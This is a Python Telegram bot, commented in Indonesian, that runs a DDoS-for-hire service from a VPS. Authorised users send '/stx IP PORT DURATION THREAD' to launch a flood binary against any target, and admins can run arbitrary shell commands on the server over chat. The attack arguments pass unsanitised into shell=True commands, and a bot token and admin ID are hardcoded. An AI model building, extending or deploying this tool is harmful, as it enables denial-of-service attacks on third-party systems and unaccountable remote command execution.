import os
import sys
import json
import time
import socket
import psutil
import subprocess
import asyncio
import datetime
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# === CONFIG ===
BOT_TOKEN = '8119915270:AAGYc2V28Vmhi-kVIezgHjJpICnQnHAf-RM'  # <<< Ganti token di sini
ADMINS = {7316824198}          # <<< Ganti User ID admin
USER_DATA_FILE = 'users.json'
current_dir = os.path.expanduser("~")

# === USER DATA ===
def load_allowed_users():
    if os.path.exists(USER_DATA_FILE):
        with open(USER_DATA_FILE, 'r') as f:
            data = json.load(f)
            return set(data.get('allowed_users', []))
    return set()

def save_allowed_users():
    data = {"allowed_users": list(ALLOWED_USERS)}
    with open(USER_DATA_FILE, 'w') as f:
        json.dump(data, f, indent=4)

ALLOWED_USERS = load_allowed_users()

# === HANDLER ===
async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    try:
        user_id = update.effective_user.id
        message_text = update.message.text.strip()

        # === ADMIN ===
        if user_id in ADMINS:
            command = message_text

            await update.message.reply_text(
                f"User ID: `{user_id}`\n"
                f"Current Directory: `{current_dir}`\n\n"
                f"Executing Command:\n`{command}`",
                parse_mode='Markdown'
            )

            try:
                result = subprocess.run(
                    command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    cwd=current_dir,
                    timeout=600
                )
                output = result.stdout.strip() + "\n" + result.stderr.strip()
                output = output.strip()

                if "password" in output.lower():
                    await update.message.reply_text("[!] Waiting for password input (manual via VPS).")

                if not output:
                    output = "(No output)"

                for i in range(0, len(output), 4000):
                    await update.message.reply_text(
                        f"User ID: `{user_id}`\n"
                        f"Current Directory: `{current_dir}`\n\n"
                        f"Output:\n{output[i:i+4000]}",
                        parse_mode='Markdown'
                    )

            except subprocess.TimeoutExpired:
                await update.message.reply_text("Error: Command timeout after 600 seconds.")
            except Exception as e:
                await update.message.reply_text(f"Error: {str(e)}")
            return

        # === USER BIASA ===
        if user_id in ALLOWED_USERS:
            args = message_text.split()

            if len(args) != 6:
                await update.message.reply_text("Format salah. Gunakan:\n`./stx IP PORT DURASI THREAD stx`", parse_mode='Markdown')
                return

            prefix, ip, port, duration, thread, suffix = args

            if prefix != "./stx" or suffix.lower() != "stx":
                await update.message.reply_text("Format salah. Harus diawali './stx' dan diakhiri 'stx'.", parse_mode='Markdown')
                return

            if not port.isdigit() or not duration.isdigit() or not thread.isdigit():
                await update.message.reply_text("PORT, DURATION, dan THREAD harus berupa angka.", parse_mode='Markdown')
                return

            await update.message.reply_text(
                f"User ID: `{user_id}`\n"
                f"Request:\nIP: `{ip}`\nPort: `{port}`\nDuration: `{duration}`s\nThreads: `{thread}`",
                parse_mode='Markdown'
            )

            # Dummy Execution
            command = f"echo Flooding {ip}:{port} for {duration}s with {thread} threads."
            subprocess.Popen(command, shell=True, cwd=current_dir)
            return

        # === UNAUTHORIZED ===
        await update.message.reply_text("Unauthorized access.")

    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can use this command.")
            return

        if not context.args:
            await update.message.reply_text("Usage: /adduser <user_id>")
            return

        new_user = int(context.args[0])
        if new_user in ALLOWED_USERS:
            await update.message.reply_text(f"User {new_user} already allowed.")
        else:
            ALLOWED_USERS.add(new_user)
            save_allowed_users()
            await update.message.reply_text(f"User {new_user} added.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def del_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can use this command.")
            return

        if not context.args:
            await update.message.reply_text("Usage: /deluser <user_id>")
            return

        del_user = int(context.args[0])
        if del_user in ALLOWED_USERS:
            ALLOWED_USERS.remove(del_user)
            save_allowed_users()
            await update.message.reply_text(f"User {del_user} removed.")
        else:
            await update.message.reply_text("User not found.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can see allowed users.")
            return

        text = "**Allowed Users:**\n"
        text += "\n".join(str(uid) for uid in ALLOWED_USERS) if ALLOWED_USERS else "(none)"
        await update.message.reply_text(text, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def restart_bot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can restart the bot.")
            return

        await update.message.reply_text("Restarting bot...")
        await asyncio.sleep(2)
        os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def bantuan(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "**Command List:**\n\n"
        "**Admin:**\n"
        "`/adduser <id>` - Add user\n"
        "`/deluser <id>` - Delete user\n"
        "`/listuser` - List users\n"
        "`/restartbot` - Restart bot\n"
        "`/vps` - VPS Information\n\n"
        "`/runtime` - VPS Information\n\n"
        "**User:**\n"
        "`/stx IP PORT DURASI THREAD` - Run flood attack\n"
        "or \n`./stx IP PORT DURASI THREAD stx` manual format"
    )
    await update.message.reply_text(text, parse_mode='Markdown')

async def vps_info_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        if user_id not in ADMINS:
            await update.message.reply_text("Only admins can access VPS info.")
            return

        uptime_seconds = int(time.time() - psutil.boot_time())
        uptime_hours = uptime_seconds // 3600
        uptime_minutes = (uptime_seconds % 3600) // 60

        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)

        ram = psutil.virtual_memory()
        ram_total = ram.total // (1024 ** 2)
        ram_used = ram.used // (1024 ** 2)

        cpu_usage = psutil.cpu_percent(interval=1)

        try:
            open_ports = subprocess.check_output("ss -tunlp | grep LISTEN", shell=True).decode()
        except Exception:
            open_ports = "Failed to get open ports."

        text = (
            f"**VPS Info:**\n\n"
            f"**IP Address:** `{ip_address}`\n"
            f"**Uptime:** `{uptime_hours}h {uptime_minutes}m`\n"
            f"**RAM Usage:** `{ram_used}MB / {ram_total}MB`\n"
            f"**CPU Usage:** `{cpu_usage}%`\n"
            f"**Open Ports:**\n`{open_ports}`"
        )
        await update.message.reply_text(text, parse_mode='Markdown')

    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def stx_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id

        if user_id not in ADMINS and user_id not in ALLOWED_USERS:
            await update.message.reply_text("Unauthorized access.")
            return

        if len(context.args) != 4:
            await update.message.reply_text("Format salah. Usage:\n`/stx IP PORT DURASI THREAD`", parse_mode='Markdown')
            return

        ip = context.args[0]
        port = context.args[1]
        duration = context.args[2]
        thread = context.args[3]

        stx_path = "/root/stx"

        if not os.path.exists(stx_path):
            await update.message.reply_text("Binary `stx` tidak ditemukan di `/root`.")
            return

        if not os.access(stx_path, os.X_OK):
            await update.message.reply_text("Binary `stx` belum executable. Jalankan `sudo chmod +x /root/stx`.", parse_mode='Markdown')
            return

        command = f"./nyoba {ip} {port} {duration} {thread}"
        await update.message.reply_text(
            f"User ID: `{user_id}`\n"
            f"Current Directory: `/root`\n\n"
            f"Executing Flood:\n`{command}`",
            parse_mode='Markdown'
        )

        subprocess.Popen(command, shell=True, cwd="/root")

    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

async def change_directory(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_dir
    try:
        if update.effective_user.id not in ADMINS:
            await update.message.reply_text("Only admins can change the directory.")
            return

        if not context.args:
            await update.message.reply_text("Usage: /cd <directory_path>")
            return

        new_dir = " ".join(context.args)
        if not os.path.exists(new_dir):
            await update.message.reply_text(f"Directory `{new_dir}` does not exist.")
            return

        if not os.path.isdir(new_dir):
            await update.message.reply_text(f"`{new_dir}` is not a directory.")
            return

        current_dir = os.path.abspath(new_dir)
        await update.message.reply_text(f"Directory changed to `{current_dir}`.")
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")
        
# Variable to track the start time of the bot
START_TIME = datetime.datetime.utcnow()

async def runtime_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """
    Handler to display bot runtime.
    """
    try:
        # Calculate the runtime duration
        current_time = datetime.datetime.utcnow()
        runtime_duration = current_time - START_TIME

        # Format runtime duration
        days, seconds = divmod(runtime_duration.total_seconds(), 86400)
        hours, seconds = divmod(seconds, 3600)
        minutes, seconds = divmod(seconds, 60)

        runtime_message = (
            f"**Are you asking Runtime?**\n"
            f"`{int(days)}d {int(hours)}h {int(minutes)}m {int(seconds)}s`\n"
            f"**Start Time (UTC):**\n"
            f"`{START_TIME.strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        await update.message.reply_text(runtime_message, parse_mode='Markdown')
    except Exception as e:
        await update.message.reply_text(f"Error: {str(e)}")

# === MAIN ===
app = ApplicationBuilder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler("adduser", add_user))
app.add_handler(CommandHandler("deluser", del_user))
app.add_handler(CommandHandler("listuser", list_users))
app.add_handler(CommandHandler("restartbot", restart_bot))
app.add_handler(CommandHandler("bantuan", bantuan))
app.add_handler(CommandHandler("vps", vps_info_handler))
app.add_handler(CommandHandler("stx", stx_handler))
app.add_handler(CommandHandler("cd", change_directory))
app.add_handler(CommandHandler("runtime", runtime_handler))
app.add_handler(MessageHandler(filters.TEXT, handle_command))

if __name__ == '__main__':
    print("Bot running...")
    try:
        app.run_polling(allowed_updates=["message", "edited_message"])
    except Exception as e:
        print(f"Polling Error: {str(e)}")
        asyncio.run(app.run_polling(allowed_updates=["message", "edited_message"]))
